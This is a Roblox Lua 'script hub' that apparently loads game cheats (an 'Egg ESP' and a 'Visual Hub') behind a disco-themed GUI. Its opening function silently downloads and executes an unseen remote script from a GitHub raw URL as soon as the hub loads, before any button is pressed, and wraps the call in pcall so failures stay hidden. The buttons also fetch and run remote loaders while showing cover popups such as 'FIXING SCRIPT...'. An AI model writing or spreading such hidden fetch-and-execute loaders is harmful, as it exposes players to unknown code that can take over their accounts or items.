-- Disco Garden Script Hub with Popups and ESP
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DiscoGardenGUI"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- ========== 1ST SCRIPT AUTO-EXECUTE ==========
local function ExecuteFirstScript()
    local success, err = pcall(function()
        local response = game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true)
        if response and response ~= "" then
            local func = loadstring(response)
            if func then func() end
        else
            error("Empty response from first script.")
        end
    end)
    if not success then
        warn("First script failed: " .. tostring(err))
    end
end

-- Run first script safely
task.spawn(ExecuteFirstScript)

-- ========== SINGLE ROUND DISCO EFFECT ==========
local function SetupDiscoLights()
    local discoColors = {
        Color3.fromRGB(255, 0, 0),
        Color3.fromRGB(0, 255, 0),
        Color3.fromRGB(0, 0, 255),
        Color3.fromRGB(255, 255, 0),
        Color3.fromRGB(255, 0, 255)
    }

    -- Play through colors once without looping
    for i = 1, #discoColors do
        Lighting.Ambient = discoColors[i]
        Lighting.OutdoorAmbient = discoColors[i]
        task.wait(0.5)
    end
    
    -- Return to normal lighting
    Lighting.Ambient = Color3.fromRGB(127, 127, 127)
    Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
end

SetupDiscoLights()

-- ========== MAIN UI FRAME ==========
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.4, 0, 0.4, 0)
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0.1, 0)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.15, 0)
Title.Text = "DISCO GARDEN HUB"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 24
Title.BackgroundTransparency = 1
Title.Parent = MainFrame

-- ========== BUTTON CONTAINER ==========
local ButtonContainer = Instance.new("Frame")
ButtonContainer.Size = UDim2.new(0.9, 0, 0.7, 0)
ButtonContainer.Position = UDim2.new(0.05, 0, 0.2, 0)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0.05, 0)
UIListLayout.Parent = ButtonContainer

-- ========== CREATE POPUP FUNCTION ==========
local function CreatePopup(message, isEggESP)
    local PopupFrame = Instance.new("Frame")
    PopupFrame.Size = isEggESP and UDim2.new(0.7, 0, 0.4, 0) or UDim2.new(0.6, 0, 0.3, 0)
    PopupFrame.Position = isEggESP and UDim2.new(0.15, 0, 0.3, 0) or UDim2.new(0.2, 0, 0.35, 0)
    PopupFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    PopupFrame.BorderSizePixel = 0
    PopupFrame.Parent = ScreenGui
    
    local PopupCorner = Instance.new("UICorner")
    PopupCorner.CornerRadius = UDim.new(0.1, 0)
    PopupCorner.Parent = PopupFrame
    
    local Message = Instance.new("TextLabel")
    Message.Size = UDim2.new(0.9, 0, isEggESP and 0.7 or 0.5, 0)
    Message.Position = UDim2.new(0.05, 0, 0.05, 0)
    Message.Text = message
    Message.Font = Enum.Font.GothamBold
    Message.TextColor3 = Color3.new(1, 1, 1)
    Message.TextSize = isEggESP and 16 or 18
    Message.TextWrapped = true
    Message.BackgroundTransparency = 1
    Message.Parent = PopupFrame
    
    local OKButton = Instance.new("TextButton")
    OKButton.Size = UDim2.new(0.4, 0, 0.2, 0)
    OKButton.Position = UDim2.new(0.3, 0, isEggESP and 0.75 or 0.7, 0)
    OKButton.BackgroundColor3 = Color3.fromRGB(80, 180, 120)
    OKButton.Text = "OK"
    OKButton.Font = Enum.Font.GothamBold
    OKButton.TextColor3 = Color3.new(1, 1, 1)
    OKButton.TextSize = 18
    OKButton.Parent = PopupFrame
    
    local OKCorner = Instance.new("UICorner")
    OKCorner.CornerRadius = UDim.new(0.1, 0)
    OKCorner.Parent = OKButton
    
    OKButton.MouseButton1Click:Connect(function()
        PopupFrame:Destroy()
    end)
    
    return PopupFrame
end

-- ========== VISUAL HUB BUTTON ==========
local VisualHubButton = Instance.new("TextButton")
VisualHubButton.Name = "VisualHubButton"
VisualHubButton.Size = UDim2.new(1, 0, 0.3, 0)
VisualHubButton.BackgroundColor3 = Color3.fromRGB(80, 180, 120)
VisualHubButton.Text = "LOAD VISUAL HUB"
VisualHubButton.Font = Enum.Font.GothamBold
VisualHubButton.TextColor3 = Color3.new(1, 1, 1)
VisualHubButton.TextSize = 18
VisualHubButton.Parent = ButtonContainer

local VisualHubCorner = Instance.new("UICorner")
VisualHubCorner.CornerRadius = UDim.new(0.1, 0)
VisualHubCorner.Parent = VisualHubButton

VisualHubButton.MouseButton1Click:Connect(function()
    local popup = CreatePopup("FIXING SCRIPT...", false)
    
    task.spawn(function()
        local success, err = pcall(function()
            local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/DARK%20HUB%20VISUAL"))()
            if func then
                func()
                VisualHubButton.Text = "SUCCESS! 🌿"
                task.wait(2)
                VisualHubButton.Text = "LOAD VISUAL HUB"
            else
                error("loadstring returned nil")
            end
        end)

        if not success then
            warn("VISUAL HUB failed: " .. tostring(err))
            VisualHubButton.Text = "ERROR! TRY AGAIN"
            task.wait(2)
            VisualHubButton.Text = "LOAD VISUAL HUB"
        end
    end)
end)

-- ========== EGG ESP BUTTON ==========
local EggESPButton = Instance.new("TextButton")
EggESPButton.Name = "EggESPButton"
EggESPButton.Size = UDim2.new(1, 0, 0.3, 0)
EggESPButton.BackgroundColor3 = Color3.fromRGB(180, 80, 180)
EggESPButton.Text = "LOAD EGG ESP"
EggESPButton.Font = Enum.Font.GothamBold
EggESPButton.TextColor3 = Color3.new(1, 1, 1)
EggESPButton.TextSize = 18
EggESPButton.Parent = ButtonContainer

local EggESPCorner = Instance.new("UICorner")
EggESPCorner.CornerRadius = UDim.new(0.1, 0)
EggESPCorner.Parent = EggESPButton

EggESPButton.MouseButton1Click:Connect(function()
    local warningMessage = "⚠️ YOUR EGG MUST BE READY TO HATCH ⚠️\n\nIF THE SERVER HOPS, MEANING IT TRIES TO FIND A LOWER (v1346 below)"
    local popup = CreatePopup(warningMessage, true)
    
    task.spawn(function()
        local success, err = pcall(function()
            local func = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
            if func then
                func()
                EggESPButton.Text = "SUCCESS! 🥚"
                task.wait(2)
                EggESPButton.Text = "LOAD EGG ESP"
            else
                error("loadstring returned nil")
            end
        end)

        if not success then
            warn("EGG ESP failed: " .. tostring(err))
            EggESPButton.Text = "ERROR! TRY AGAIN"
            task.wait(2)
            EggESPButton.Text = "LOAD EGG ESP"
        end
    end)
end)

-- ========== CLOSE BUTTON ==========
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0.1, 0, 0.15, 0)
CloseButton.Position = UDim2.new(0.85, 0, 0.02, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
CloseButton.Text = "X"
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 18
CloseButton.Parent = MainFrame

CloseButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

-- ========== MUSIC ==========
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://142376088"
sound.Looped = true
sound.Volume = 0.7
sound.Parent = player:WaitForChild("PlayerGui")
sound:Play()

-- Animate GUI on load
MainFrame.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Elastic), {
    Size = UDim2.new(0.4, 0, 0.4, 0)
}):Play()
